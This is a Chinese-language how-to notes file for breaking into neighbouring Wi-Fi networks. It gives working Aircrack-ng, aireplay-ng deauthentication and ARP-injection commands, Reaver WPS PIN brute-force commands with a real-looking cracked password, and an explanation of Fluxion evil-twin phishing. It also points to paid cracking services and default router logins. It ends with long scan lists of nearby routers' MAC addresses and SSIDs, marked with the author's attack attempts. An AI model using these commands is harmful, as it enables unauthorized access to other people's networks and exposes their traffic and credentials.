❤️️ 文章简介:
================================================================================


    wifi 破解 基本知识介绍.
    wifi 破解方法1: wps 
        wifi 路由器破解: hydra

    wifi 破解方法2: Fluxion 
    wifi 破解方法1: 字典暴破 

    Netgear 6300v2 刷 DDwrt
    wifi 中继设置
    wifi 信号分析





🔵 Aircrack-ng
================================================================================

    破解wifi 最出名的就是 Aircrack-ng 套件.
    这个套件可以安装在Linux下. 也能安装在Mac下.
    ❗️❗️❗️ 强烈建议在Kali下使用Aircrack-ng套件. 同样的套件 Kali下的功能比Mac强大多了.
    ❗️❗️❗️ 强烈建议在Kali下使用Aircrack-ng套件. 同样的套件 Kali下的功能比Mac强大多了.
    ❗️❗️❗️ 强烈建议在Kali下使用Aircrack-ng套件. 同样的套件 Kali下的功能比Mac强大多了.

    Linux 可以使用Aircrack-ng 套件里的所有套件.
    Mac 只能用aircrack-ng suite.中的某几个组件!!! 
    当然Mac也是可以用来破解wifi的.下面简介Mac用字典暴力破解wifi

    🔸 Airport
        其实OSX本身有个命令行工具：airport，利用这个工具可以方便的实现airmon-ng中的某些功能!!!比如查看附近wifi.

        /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport 
        最好添加airport的环境路径. 不然用airport 每次都要输这么长的命令...

    🔸 Mac Airport 查看附近 wifi：
        /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 scan
          219 6c:b0:ce:bd:d1:5b -27  3       N  -- WPA2(PSK/AES/AES)
          219-5 6c:b0:ce:bd:d1:5a -26  153   Y  -- WPA2(PSK/AES/AES)

    🔸 Mac 安装 aircrack-ng 套件.   brew install aircrack-ng

    🔸 Mac 抓握手包.
        sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff 3

          en0   本机无线网卡设备；
          sniff 嗅探.
          3     要破解wifi的信道
          结束抓包后的数据保存在/tmp.

          等待一段时间，后就可以按control+C结束监听，
          ❗️ 这里就是为什么不推荐用Mac来抓包了.
          Mac下你完全不知道是否抓到握手包了.
          用Kali 抓包 就能实时显示是否抓到握手包.

          这时看到提示，一个airportSniffXXXXXX.cap的文件被保存在/tmp文件夹中。
          现在就可以使用类似wireshark之类的网络分析工具在线下打开它了。

          现在你用手机去连 219 这个wifi.连上后就可以停止抓包(Ctrl + C)了..
          ❗️ 连wifi: 不一定要输入wifi密码.如果别人之前连过wifi的.只要打开wifi 也算连的! 也可以获取握手包.
          ❗️ 人家走来走去. 就会不停的连wifi. 所以这个 握手包是比较容易获得的. 重点就是字典密码..

    🔸 Mac 分析破解握手包
        sudo aircrack-ng -w ~/passwords.txt /tmp/airportSniffCd2nGz.cap | grep handshake
          1  6C:B0:CE:BD:D1:5B  219                       WPA (1 handshake)
          2  CC:81:DA:41:BE:58  @PHICOMM_50               WPA (0 handshake)
          3  D8:49:0B:A7:47:F0  ChinaNet-Ccfr             WPA (0 handshake)

              -w：  指定字典文件路径；
              －b： 指定要破解的wifi 地址
              /tmp. 抓包文件路径.
              grep: 有抓到 handshake 数据包的wifi才能进行下一步的破解!!.
                    上面只有第一个是可以用字典开尝试出对方密码的.
                    这里必须用grep. 你抓到的数据是成千上万条. 你必须进行过滤.
                    handshake 前面的数字不为0的才有用. 
                    handshake 前面的数字为0的都没用的.



🔵 握手包

    wifi破解中对我们最重要的数据包是：包含密码的包----也叫握手包。
    当有新用户或老用户断开后自动连接wifi时，都会发送握手包.



  🔵 wifi 破解思路.
================================================================================

    4种方法. 强烈建议按顺序尝试.方法选择很重要!!!  
    
    🔸1.  尝试各种wifi钥匙.

    🔸2.  wps (Reaver)破解: 

            路由器 wps 功能:
            WPS用于简化Wi-Fi无线的安全设置和网络管理。

            它支持两种模式：
            个人识别码(PIN)模式和按钮(PBC)模式。
            路由器在出产时默认都开启了wps但这真的安全么！

            个人码(PIN)
            有人可能会问了什么是pin码？
            WPS技术会随机产生一个八位数字的字符串作为个人识别号码（PIN）
            Pin码会分成前半四码和后半四码。
            前四码如果错误的话，那路由器就会直接送出错误讯息，而不会继续看后四码，意味着试到正确的前四码，最多只需要试 10000 组号码。
            一旦没有错误讯息，就表示前四码是正确的，而我们便可以开始尝试后四码。 
            后四码比前四码还要简单，因为八码中的最后一码是检查码，由前面七个数字产生，
            因此实际上要试的只有三个数字，共一千个组合。
            这使得原本最高应该可达一千万组的密码组合（七位数+检查码），瞬间缩减到仅剩 11,000 组，大幅降低破解所需的时间.

            根据路由MAC地址算出默认pin码
            另外有种更快破解wifi的方法就是根据路由MAC地址（MAC是路由器的物理地址，是唯一的识别标志）算出默认出产时的pin码例如以下软件 还可以通过别人共享的找到pin码！

            腾达某款某Mac地址能算出路由器的Pin码
            适用于MAC地址前6位为“C83A35/00B00C”的无线路由器
            为了确保Pin的真实性,最好用 Inflator （俗称:打气筒) 进行验证一下,顺便跑出PSK密码,一般输入计算出来的前五位数
            接下来就交给打气筒跑，这样才能更好的保证密码出来.


            如果无线路由器开启了WPS，60+% 的路由器都开启这个wps功能!! 就可以用这种攻击方法.成功率极高.
            
            WPS的pin码并没有加密,Reaver会暴力破解pin码，
            找到pin码也就找到了密码。一般用 2-12小时.就能破解.
            当然有效高级点的路由器有保护机制. 
            你尝试次数过多就不然你尝试. 如下面的提示.这样就只能换别的方法了.
            [+] Sending EAPOL START request
            [!] WARNING: Receive timeout occurred            




    🔸3. Fluxion 破解:
            fluxion 无线破解工具，原理更偏向于社会工程学中的钓鱼.
            让wifi主人自己输入密码. 免去跑包时间

            Fluxion 创建一个名字和对方一模一样的假wifi. 
            Fluxion 利用攻击 强制断线对方路由器下所有客户端. 
            被踢的客户端手动连接到我们的假wifi.
            连接过程中我们的假wifi会弹框要求输入真路由器的wifi密码. 
            对方输对了就停止攻击. 就获得对方密码了.
            对方输错了就一直攻击. 


    🔸4.  跑包 - 暴力破解: 
            用密码字典暴力破解.费时费力费电.是没办法的办法. 破解率只有30%左右.
            对方是弱密码就好破解.对方强密码就很难破解.
            简单点说 你的字典里有对方密码.那么就能破解.不然就没戏..
            重点就是字典. 找字典也麻烦. 而且字典大小往往5G+ 的...

            暴力破解就是抓取一个 对方wifi的握手包.
            这个握手包里有对方路由器 用wpa2加密方式加密后的密码的!!!
            加密是不可逆的! 
                你可以用 wpa2 方式加密 12345678 这个密码, 得到很长一串加密后的密码 xxxxxxx.
                就算你获取了 xxxxxxx 这个加密后的密码(这里也就是握手包). 
                也知道对方是用wpa2这种加密方式加密的.
                但是你是算不出 12345678 这个密码的.
                你能做的只能是尝试. 
                你的爆破字典里有千万密码. 
                每个密码都用wpa2 这个加密方式得到对应的加密后的密码. 
                用这个加密后的密码 和 wifi握手包里的加密后的密码对比. 
                如果一致就说明找到密码了.


      🔸 5. 路由器漏洞 ???  未亲测!!!

              路由器本身就有一些漏洞.
              暴力破解还不行的话.可以考虑利用路由器漏洞

              Routerpwn 只是一个网站 但是可以直接查看路由器漏洞.
              http://routerpwn.com/

              这个网站 列出很多的路由器厂家.比如国内最常见的  tplink 
              左边是漏洞种类. 右边是 该漏洞涉及的型号

              网页漏洞 右边 有个设置IP的. 填上路由器的IP地址.
              然后 跳出登录界面. 一般都是 admin admin

              ## arpspoof
              Arpspoof是一个非常好的ARP欺骗的源代码程序。它的运行不会影响整个网络的通信，该工具通过替换传输中的数据从而达到对目标的欺骗。




🔵 暴力破解 简介:
================================================================================

  5 位数密码 普通电脑破解 2-7天
  10位数密码 普通电脑破解 x年!!

🔸 Tables 

    在很多年前，国外的黑客们就发现单纯地通过导入字典，采用和目标同等算法破解，
    其速度其实是非常缓慢的，就效率而言根本不能满足实战需要。
    之后通过大量的尝试和总结，黑客们发现如果能够实现直接建立出一个数据文件，
    里面事先记录了采用和目标采用同样算法计算后生成的Hash散列数值，
    在需要破解的时候直接调用这样的文件进行比对，破解效率就可以大幅度地，甚至成百近千近万倍地提高，
    这样事先构造的Hash散列数据文件在安全界被称之为Table表(文件)。


🔸 Rainbow Tables

    最出名的Tables是Rainbow Tables，即安全界中常提及的彩虹表，它是以Windows的用户帐户LM/NTLM散列为破解对象的。
    在 Windows2000/XP/2003系统下，账户密码并不是明文保存的，而是通过微软所定义的算法，保存为一种无法直接识别的文件，即通常所说的SAM文件，
    这个文件在系统工作时因为被调用所以不能够被直接破解。
    但我们可以将其以Hash即散列的方式提取，以方便导入到专业工具破解，提取出来的密码散列类似于下面：

    1、Administrator:500:96e95ed6bad37454aad3b435b51404ee:64e2d1e9b06cb8c8b05e42f0e6605c74:::

    若是以传统破解方式而言，无论是本地，还是内网在线破解，效率都不是很高。
    据实际测试，单机环境下，破解一个14位长包含大小写字母以及数字的无规律密码，一般是需要3~~9小时的，
    这个时间值会随着密码的复杂度及计算机性能差异提升到几天甚至数月不等。
    虽然说大部分人都不会使用这样复杂的密码，但对于目前很多密码足够复杂并且长度超过10位的密码比如“Y1a9n7g9z0h7e”，还是会令黑客们头痛不已。

    2003年7月瑞士洛桑联邦技术学院Philippe Oechslin公布了一些实验结果，他及其所属的安全及密码学实验室(LASEC)采用了时间内存替换的方法，使得密码破解的效率大大提高。作为一个例子，他们将一个常用操作系统的密码破解速度由1分41秒，提升到13.6秒。这一方法使用了大型查找表对加密的密码和由人输入的文本进行匹配，从而加速了解密所需要的计算。这种被称作“内存-时间平衡”的方法意味着使用大量内存的黑客能够减少破解密码所需要的时间。

    于是，一些受到启发的黑客们事先制作出包含几乎所有可能密码的字典，然后再将其全部转换成NTLM Hash文件，这样，在实际破解的时候，就不需要再进行密码与Hash之间的转换，直接就可以通过文件中的Hash散列比对来破解Windows帐户密码，节省了大量的系统资源，使得效率能够大幅度提升。当然，这只是简单的表述，采用的这个方法在国际上就被称为Time-Memory Trade-Off ，即刚才所说的“内存-时间平衡”法，有的地方也会翻译成“时间—内存交替运算法”。其原理可以理解为以内存换取时间



  🔸 Misc
    正是由于Rainbow Tables的存在，使得普通电脑在5分钟内破解14位长足够复杂的Windows帐户密码成为可能。
    如上图4可以看到，类似于c78j33c6hnws、yemawangluo178、38911770这样的Windows帐户密码几乎全部在180秒即3分钟内破出，最短只用了5秒，个别稍长的密码破解开也没有超过3分钟。


    现在，在理解了“内存-时间平衡”法和Table的存在意义后，让我们回到无线领域，破解WPA-PSK也是同样的意思。在2006年举行的RECON 2006安全会议上，一位来自Openciphers组织的名为David Hulton的安全人员详细演示了使用WPA-PSK Hash Tables破解的技术细节，给与会者极大的震动。

    下面所示的为会议上引用的WPA加密以及主密钥对匹配等建立WPA Tables所需理念的原理图，其中，MK为密码原文，PMK就是通过PBKDF2运算所得出的数值，PTK就是在PMK的基础上进行预运算产生的WPA Hash，这个Hash将用来和WPA 握手包中的值对照，若匹配即为密码。

    当然，要说明的是，Tables的建立并没有想象的那么容易，就建立本身而言，其效率非常低下，加上需要指定预攻击AP的SSID，想要建立一套针对所有常见接入点，并采用简单密码的WPA-PSK Hash Tables，其生成文件占据的硬盘空间最少也要1~~3G


    不过，对于无线网络管理员，并不能因此松一口气，真正的噩梦才刚刚开始，因为这个方法也同样适用于破解WPA2加密。而且，国外一些地下高级黑客组织，也已经建立了高达500G的详尽WPA/WPA2攻击Table库，甚至一些基本完善的WPA-PSK Hash Tables已经在黑客网站上开始公开出售，只需要支付120美金左右，就会有8张包含WPA-PSK Hash Tables 的DVD光盘通过Fedex直接送到你的手上。




  🔸 暴力破解加速
    wpa 加密的无线很容易收到 字典攻击.
    普通电脑 跑一个好点的字典需要 几天/几星期.
    但是有网站专门提供破解wifi的字典. 并且提供强大的服务器.帮你破解密码!!!!
    只需要几十分钟/几小时就可以...

    字典: 有很多
    普通字典.  500MB .能破解20%的wifi.
    中国拼音字典、手机字典、字母数字字典.
    服务器资源有限. 不可能每个wifi都跑一个非常非常大的字典的..

    收费跑包网站... https://gpuhash.me/?menu=cn-main
        简单字典免费跑.但是跑出的密码 要 0.005btc..
        高级字典不管是否成功 收费 0..15 BTC 









  🔵 wifi 三种加密方式: 
================================================================================

        wep   非常少见,已过时
        wpa   少见.
        wpa2  最最常见

            不同的加密方式的wifi密码破解难度不一样.
            wep加密方式很古老了.几乎见不到了.分分钟就能破解. 
            wpa 加密方式也很少见. wpa2 加密方式是最常见的. 本文就以wpa2 为例.


            🔸 wep 破解简介
                只要获得足够的 beacons 和 data 数据就可以破解.
                理想情况下是100000+。你可以等，也可以使用aireplay加快这个进程。

                aireplay-ng -1 0 -a C8:3A:35:30:3E:C8 wlan0mon
                aireplay-ng -3 -b C8:3A:35:30:3E:C8 wlan0mon
                                          等到抓取的数据充足，Ctrl+C停止

                aircrack-ng ~/*.cap       开始破解
                airmon-ng stop wlan0mon   最后.结束无线网卡的监控模式：






🔵Aircrack-ng  
    破解无线 WPA2 加密的工具套装. 了解就好.不必深入.

    🔸aircrack-ng
      主要用于WEP及WPA-PSK密码的恢复，
      只要airodump-ng收集到足够数量的数据包，aircrack-ng就可以自动检测数据包并判断是否可以破解

    🔸airmon-ng
        用于改变无线网卡工作模式，以便其他工具的顺利使用
        🔅 sudo airmon-ng start wlan0mon 
          wlan0mon 参考 ifconfig 里的无线网卡名称
          本来是 wlan0 开启监听模式后 就变成 wlan0mon 了 
          用于嗅探的网卡是一定要处于monitor监听模式地,对于无线网络的嗅探也是一样。

    🔸airodump-ng     查连接路由器的客户端的 Mac
        🔅 sudo airodump-ng wlan0mon
          bssid  是路由器 mac 地址
          station 是客户端/手机的 mac 地址
          这里能看到 那个路由器下面 连了哪个手机.

        🔅sudo airodump-ng --ivs –w longas -c 6 wlan0mon
            —ivs  设置过滤    减少文件大小
            —c  设置 要进行攻击/破解的路由器的 工作频道 
            —w 保存文件名 w=write 的意思 生成的文件 文件名会变成 longas-01.ivs 第一次攻击 就是longas-01.ivs 第二次攻击 就是  longas-02.ivs


    🔸aireplay-ng
        在进行WEP及WPA-PSK密码恢复时，可以根据需要创建特殊的无线网络数据报文及流量

        若连接着该无线路由器/AP的无线客户端正在进行大流量的交互，比如使用迅雷、电骡进行大文件下载等，则可以依靠单纯的抓包就可以破解出WEP密码。

        但是无线黑客们觉得这样的等待有时候过于漫长，于是就采用了一种称之为“ARP Request”的方式来读取ARP请求报文，并伪造报文再次重发出去，以便刺激AP产生更多的数据包，从而加快破解过程，这种方法就称之为ArpRequest注入攻击。

        具体输入命令如下：
        aireplay-ng -3 -b AP的mac -h 客户端的mac wlan0mon 

        参数解释：
        -3 指采用ARPRequesr注入攻击模式；
        -b 后跟AP的MAC地址，这里就是前面我们探测到的SSID为TPLINK的AP的MAC；
        -h 后跟客户端的MAC地址，也就是我们前面探测到的有效无线客户端的MAC；
        最后跟上无线网卡的名称，这里就是mon0啦。
        回车后将会看到如下图12所示的读取无线数据报文，从中获取ARP报文的情况出现。



    🔸airserv-ng    可以将无线网卡连接至某一特定端口，为攻击时灵活调用做准备
    🔸airolib-ng    进行WPA Rainbow Table攻击时使用，用于建立特定数据库文件
    🔸airdecap-ng   用于解开处于加密状态的数据包






🔵  查看隐藏ssid.
    查看wifi的时候 有些wifi名字是 length xx 的 没有ap名. 但是bssid 还是有的.
    这些路由器就是隐藏了ssid的!!!  要找出ssid 很简单.
    
    查看ssid 方法:
    # airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 wlan0mon
    # aireplay-ng -0 30 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon
    破解密码的方法不变；使用上面两个命令就可以轻松得到ap名。
    事实证明，隐藏SSID并不管啥事；其实设置一个复杂的密码比隐藏SSID要管用的多。




🔵 wifi 蜜罐

    假冒的系统. 对对方进行监控...

    “热点蜜罐”(Hot-spot Honeypot)，吸引试图连接到WiFi的设备。
    WiFi Pineapple能伪装成用户的设备在“寻找”的WiFi网络。
    WiFi Pineapple只适用于没有加密的WiFi网络，对使用WPA加密的WiFi网络不起作用

    cain&able 局域网渗透的工具，能看到对方很多密码的明文，对方都上了那些网站，自己去看看教程吧，很老的工具了。
    应该还有更好使的，我就不太清楚了。
    PS：架设蜜罐WIFI很不道德………………

    初级：可以看上网记录  ps：http
    用你电脑建立wifi，ssid设置为他人曾经连接过的ssid名称，然后打开抓包软件（wireshark）设定好网卡（你发送wifi的网卡）开始抓取，然后看对应的协议层数据就行了。









  🔵 软硬件环境:
    Kali (必须) + USB无线网卡(必须): Netgear WNA1100 

    🔸 Kali 
          可以是虚拟机. 也可以是实体机.  强烈建议用虚拟机.非常方便!!
          如果是Kali虚拟机, 要让Kali识别无线网卡.就必须用外置无线网卡.
          如果是Kali实体机. 要让Kali识别无线网卡.可以用笔记本内置网卡.

          Kali开启 ssh
              - vi /etc/ssh/sshd_config
                  PermitRootLogin yes  这行改成这样.
              - service ssh restart
              - service ssh status


    🔸 无线网卡

        不管实体机是用有线还是无线上网的. 到了虚拟机都是有线方式上网的.
        
        比如要用kali虚拟机来破解wifi,那么必须要让虚拟机可以使用无线网卡.
        由于虚拟机的种种原因.
        虚拟机不能使用笔记本内置的无线网卡!!!只能在笔记本上再插个外置USB无线网卡.

        ❗️❗️❗️如果虚拟机里要使用无线网卡,只能使用外置无线网卡!❗️❗️❗️
        ❗️❗️❗️如果虚拟机里要使用无线网卡,只能使用外置无线网卡!❗️❗️❗️

        ❗️❗️❗️不是所有无线网卡都能在Linux下运行的!!要看型号的.❗️❗️❗️
        ❗️❗️❗️不是所有无线网卡都能在Linux下运行的!!要看型号的.❗️❗️❗️

          🔸 查看虚拟机无线网卡情况
              ifconfig → 出现类似 wlan0的(wlan开头的)才说明虚拟机识别到了无线网卡.
              如果你用虚拟机运行Kali. 不用外置的USB网卡 是永远也不会有wlan网卡出现的.
              别多想了. 20块钱的WNA1100无线网卡. 最最便宜的了.买吧.

          🔸 Kali 虚拟机推荐USB网卡:
              - Netgear WNA1100 我用的那个...淘宝 20块钱一个!!!
              - TP-LINK WN722N 要v1版本. 不要V2版本.贵! 得150￥+  不推荐..... 

          🔸 Kali VM虚拟机无线网卡驱动
              Netgear WNA1100 至少在 kali 2016.2 版本是免驱的. 插上连到虚拟机就能用










⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️--WPS 破解---⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️

如果发送pin码过快，有可能造成路由器崩溃；就类似对服务器的DDOS攻击。

🔅 airmon-ng start wlan0 && wash -i wlan0mon  开启无线网卡监控模式 并  查看四周开启wps的 wifi  
🔅 airodump-ng wlan0mon    查看四周所有 wifi      

BSSID                  Channel       RSSI       WPS Version       WPS Locked        ESSID
------------------------------------------------------------------------------------------
F0:B4:29:DA:BB:84       8            00        1.0               No                (null)
A8:57:4E:D1:ED:6A      11            00        1.0               No                T2-20B
50:BD:5F:4C:44:C7       3            00        1.0               No         Birdhouse 2.4G

如果什么也没有表示周围没有开启WPS的无线路由器。记住要破解wifi的BSSID。
wps locked 下是no  ➜  wps 没有被关闭.  ➜ 也就是说wps是开启的...

🔅 reaver -i wlan0mon -b E4:D3:32:B4:83:BC -vv -a    开始破解 接下来就是等... 2-10个小时...
   👁‍🗨 有些路由器对pin破解次数有一点限制. 会自动停止几秒.再自动破解. 反正等就是了..

    [+] Sending M2 message
    [P] E-Hash1: 59:24:ff:26:5d:e6:7f:54:d5:ef:aa:fa:5b:15:25:8e:5b:d1:3e:3d:db:bf:69:92:a6:ef:20:ad:23:ad:10:d9
    [P] E-Hash2: 9d:be:01:06:88:40:4d:ef:61:7d:6e:0d:e7:12:bc:6f:88:fd:b6:34:d2:9d:67:22:0b:b4:72:9d:dd:87:aa:e0
    [+] Received M3 message
    [+] Sending M4 message
    [+] Received M5 message
    [+] Sending M6 message
    [+] Received M7 message
    [+] Sending WSC NACK
    [+] Sending WSC NACK
    [+] Pin cracked in 31654 seconds
    [+] WPS PIN: '31070003'
    [+] WPA PSK: 'njs236121'
    [+] AP SSID: 'MERCURY_210'

      👹 njs236121 就是wifi密码了!!!!  等了8.8小时.












🔵 Reaver 命令详解

  reaver -i mon0 -b mac -S -v 
    -i 监听后接口名称
    -b 目标mac地址
    -a 自动检测目标AP最佳配置
    -S 使用最小的DH key（可以提高PJ速度）
    -vv 显示更多的非严重警告
    -d  即delay每穷举一次的闲置时间 预设为1秒
    -t  即timeout每次穷举等待反馈的最长时间
    -c  指定频道可以方便找到信号，如-c1 指定1频道

    示例: 
    🔸 reaver -i mon0 -b MAC -a -S –d9 –t9 -vv
    　 reaver -i wlan1 -b 54:E6:FC:35:C5:82 -S -N -vv -c 4

  　　应因状况调整参数（-c后面都已目标频道为1作为例子）
  　　目标信号非常好: reaver -i mon0 -b MAC -a -S -vv -d0 -c 1
  　　目标信号普通: reaver -i mon0 -b MAC -a -S -vv -d2 -t 5 -c 1
  　　目标信号一般: reaver -i mon0 -b MAC -a -S -vv -d5 -c 1

      在穷举的过程中，reaver会生成以路由mac地址为名的wpc文件,
      这个文件在kali系统中/etc/reaver/文件夹下。
      一时半会pin不出来，过段时间pin的时候命令加参数 -s file.wpc，就会根据之前的进度继续pin。

　 🔸 注意点：

　　1.一般reaver 前四位默认是从0开始，如果想从指定的数值开始爆破需要添加-p参数：
      -p 9000,这个意思就是从9000开始，只要不pin死路由器，可以多开几个窗口，从不同的数值开始。

　　2.最后pin完最后会显示WPS PIN(正确的pin码)和WPA PSK(wifi密码)，
      同时如果WPS功能没关，pin码没修改，无论怎样修改密码，都可以通过pin码获取wifi密码: 
      reaver -i mon0 -b mac -p pin码，来再次得到密码

　　3.一般pin的过快，会把路由器pin死，所以一般还会加上-d5 -t5参数，添加5秒延时，当然数值可以自己改。
 
　  4.防范措施：
　　  - WPS功能对个人基本上没啥作用，还是关了吧。
　　  - 现在的路由一般会有防pin措施，例如会有300秒pin限制，但这个是伪防pin,作用不是很大




















reaver -i wlan0mon -b A8:57:4E:A7:47:2C -vv

7C:08:D9:DB:2C:CA   1  00  1.0  No   ChinaNGB-602
28:6C:07:43:98:8C   1  00  1.0  No   Tommy's appartment
38:83:45:FD:82:12   1  00  1.0  No   tingting
E0:28:61:7D:9A:A8   1  00  1.0  No   ChinaNet-fmWT
08:10:7A:1D:9E:A7   1  00  1.0  No   ChinaNet-2.4G-Home  HuA
D4:67:E7:0F:1B:59   1  00  1.0  No   ChinaNet-iPTy
98:BC:57:6C:C1:B3   1  00  1.0  No   ChinaNGB-YdXfJX
D0:60:8C:41:B0:EA   3  00  1.0  No   ChinaNet-m77z
F0:B4:29:D1:69:C3   3  00  1.0  No   5G就是它               ❌.WARNING: Receive timeout occurred
FC:19:D0:4C:0E:6A   3  00  1.0  No   ChinaNGB-1607
00:E0:01:00:FD:84   4  00  1.0  No   vYou_DDPai_mini2
A0:91:C8:49:96:AE   5  00  1.0  No   ChinaNet-4JQw
F4:CB:52:07:9C:FC   5  00  1.0  No   HUAWEI-4ARMLN
EC:88:8F:54:66:60   6  00  1.0  No   wqs12
8C:21:0A:90:08:AC   6  00  1.0  No   MERCURY_9008AC
60:BB:0C:61:38:0E   6  00  1.0  No   ChinaNet-yQu6
14:75:90:C7:9A:02   6  00  1.0  No   lulu
BC:D1:77:B3:11:C0   6  00  1.0  No   TP-LINK_B311C0
D4:A1:48:92:30:C4   6  00  1.0  No   appleshi_2.4G
14:75:90:08:4D:5E   6  00  1.0  No   lys               ❌. timeout... WARNING: Receive timeout occurred
D4:61:2E:BE:61:33   6  00  1.0  No   HUAWEI-KTNNYX
5C:63:BF:FE:8A:B8   8  00  1.0  No   ChinaNet-8AB8     ✔ ?? .... 信号不好么...  买!!
F0:B4:29:E6:D2:C1   8  00  1.0  No   Xiaomi_D2C0
D0:60:8C:42:F6:9A  10  00  1.0  No   ChinaNet-3KXp
BC:D1:77:49:38:7A  11  00  1.0  No   TP-LINK_49387A
E0:28:61:81:FA:20  11  00  1.0  No   ChinaNet-UXjM
A8:57:4E:A7:47:2C  11  00  1.0  No   UU          ❌. timeout... WARNING: Receive timeout occurred              
80:D4:A5:29:85:28  11  00  1.0  No   CU_GKB2
C4:C7:55:0F:85:31  11  00  1.0  No   ChinaNet-9d2f
FC:19:D0:3E:45:2F  11  00  1.0  No   ChinaNGB-Lja7VQ
D4:AD:2D:01:F6:95  11  00  1.0  No   ChinaNet-i7kp
78:C1:A7:0B:88:4E  11  00  1.0  No   ZTE-2.4G-0B884E
00:24:A5:34:C1:CD  11  00  1.0  No   zjhBuffalo-G-TKIP
7C:08:D9:B5:FD:6E  12  00  1.0  No   ChinaNGB-1710
98:BC:57:70:62:A9  13  00  1.0  No   ChinaNGB-YdM7rV
28:6C:07:DB:6B:F1  13  00  1.0  No   Xiaomi_6BF0
7C:08:D9:B6:A6:5B  13  00  1.0  No   ChinaNGB-1610
44:6E:E5:96:9F:44   1  00  1.0  No   HUAWEI-CJD44D
98:BC:57:3B:D3:7A   1  00  1.0  Yes  ChinaNGB-YDDeCa
08:3F:BC:B0:B1:ED   4  00  1.0  No   ChinaNet-V7Su
50:BD:5F:05:22:F2   6  00  1.0  No   TP-LINK_22F2
60:BB:0C:DB:33:ED   6  00  1.0  No   ChinaNet-2XSV
F0:B4:29:21:07:A5  11  00  1.0  No   G-family
98:F4:28:01:69:4E  11  00  1.0  No   ChinaNet-WG2t
98:BC:57:6C:E5:50  12  00  1.0  No   ChinaNGB-YdcC6d
6C:59:40:14:58:A8   1  00  1.0  No   MERCURY_58A8
68:9F:F0:5A:B8:2D   1  00  1.0  No   ChinaNet-HiAA
9C:21:6A:F9:E9:F5   1  00  1.0  No   xiaokeai              ....  ❌ ❌
98:BC:57:72:43:9C   3  00  1.0  No   ChinaNGB-YdeK7p
28:6C:07:CC:CD:A8   3  00  1.0  No   Xiaomi_CDA7
D0:60:8C:42:B2:B7   1  00  1.0  No   ChinaNet-sy43
7C:08:D9:B6:85:76   2  00  1.0  No   ChinaNGB-CHHkXB
14:75:90:4D:16:C6   6  00  1.0  No   TP888888
60:BB:0C:B3:3A:E0   6  00  1.0  No   ChinaNet-RtVF
F0:B4:29:E6:A7:FE   8  00  1.0  No   Xiaomi_1902
54:BE:53:5A:B9:47  11  00  1.0  No   ChinaNet-6xkb
98:BC:57:6C:E4:FC  12  00  1.0  No   ChinaNGB-Yd2SQK
98:BC:57:5B:A5:7E  13  00  1.0  No   ChinaNGB-Yd7TU2
00:16:78:4D:D2:78   3  00  1.0  No   JYJS
7C:08:D9:E7:17:D1   1  00  1.0  No   ChinaNGB-321
68:9F:F0:5A:98:F5   8  00  1.0  No   ChinaNet-X3ey
BC:D1:77:29:EC:A0   1  00  1.0  No   Wu LieJian
F4:B8:A7:6C:34:BC   6  00  1.0  No   ChinaNet-TA5N
F4:B8:A7:68:2C:B0   8  00  1.0  No   ChinaNet-aSsQ
08:10:7A:28:99:0E  11  00  1.0  No   ChinaNet-2.4G-990E
D0:C7:C0:5F:91:3C  11  00  1.0  No   TP-LINK_913C
7C:08:D9:D6:08:FE   1  00  1.0  No   ChinaNGB-KiTN
8E:BE:BE:26:A7:D3  10  00  1.0  No   Xiaomi_Hello_adDx
F0:B4:29:FE:38:53   1  00  1.0  No   小米666
10:6F:3F:DA:4D:A4   8  00  1.0  No   106F3FDA4DA4-1
F4:CB:52:09:BE:50   3  00  1.0  No   2201
28:6C:07:67:42:6E   4  00  1.0  No   Xiaomi_426D
08:3F:BC:BC:07:EF   5  00  1.0  No   ChinaNet-cVjp
F4:EE:14:00:93:DC  11  00  1.0  No   MERCURY
E0:28:61:C3:59:AC   5  00  1.0  No   ChinaNet-wqD6
8C:BE:BE:26:A7:D1  10  00  1.0  No   Xiaomi_A7D0
D4:67:E7:0C:AC:B1   1  00  1.0  No   ChinaNet-a9MG










BSSID              Ch  dBm  WPS  Lck  ESSID
--------------------------------------------------------------------------------
E4:D3:32:B4:83:BC   9  -81  1.0  No   MERCURY_210
98:BC:57:5B:A5:7E  13  -73  1.0  No   ChinaNGB-Yd7TU2
18:44:E6:73:CA:CF   1  -75  1.0  No   ChinaNet-VTka          reaver -i wlan0mon -b 18:44:E6:73:CA:CF -vv  ❌
98:BC:57:6C:C1:B3   1  -77  1.0  No   ChinaNGB-YdXfJX
DC:2A:14:1A:00:F2   3  -71  1.0  No   ChinaNGB-onshine
14:75:90:08:4D:5E   6  -67  1.0  No   lys                     reaver -i wlan0mon -b 14:75:90:08:4D:5E -vv  ❌
68:9F:F0:5A:98:F5   8  -57  1.0  No   ChinaNet-X3ey
5C:63:BF:FE:8A:B8   8  -57  1.0  No   ChinaNet-8AB8
B8:08:D7:51:A4:48   8  -59  1.0  No   HUAWEI  403
FC:19:D0:3E:07:67   8  -67  1.0  No   ChinaNGB-Ljf9hf
D0:60:8C:42:F6:9A  10  -45  1.0  No   ChinaNet-3KXp
54:BE:53:5A:B9:47  11  -65  1.0  No   ChinaNet-6xkb
E0:28:61:81:FA:20  11  -45  1.0  No   ChinaNet-UXjM
F0:B4:29:21:07:A5  11  -65  1.0  No   G-family
D4:61:2E:BE:61:33  11  -65  1.0  No   HUAWEI-KTNNYX
78:A1:06:F4:F0:CE  11  -61  1.0  No   TP-LINK_F4F0CE
78:C1:A7:0B:88:4E  11  -59  1.0  No   ZTE-2.4G-0B884E
F4:EE:14:00:93:DC  11  -57  1.0  No   MERCURY
28:6C:07:43:98:8C   1  -59  1.0  No   Tommy's appartment
08:10:7A:1D:9E:A7   1  -63  1.0  No   ChinaNet-2.4G-Home  HuA
98:BC:57:5D:30:5A   1  -63  1.0  No   ChinaNGB-YdPmCF
FC:19:D0:4C:0E:6A   3  -55  1.0  No   ChinaNGB-1607
B8:08:D7:76:FF:88   5  -57  1.0  No   HW_001
20:DC:E6:EF:C5:76   6  -61  1.0  No   TP-LINK_EFC576
